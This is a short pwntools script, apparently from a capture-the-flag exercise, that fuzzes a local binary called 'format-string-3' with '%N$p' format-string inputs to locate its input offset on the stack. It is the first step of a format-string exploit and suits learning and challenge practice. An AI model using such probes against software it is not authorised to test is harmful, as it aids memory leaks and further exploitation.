from pwn import *
elf = context.binary = ELF("./format-string-3")

for i in range(50):
    p = process()
    p.sendline(f"AAAAAAAA|%{i}$p")
    print(f"{i}: {p.recvall()}")
    p.close()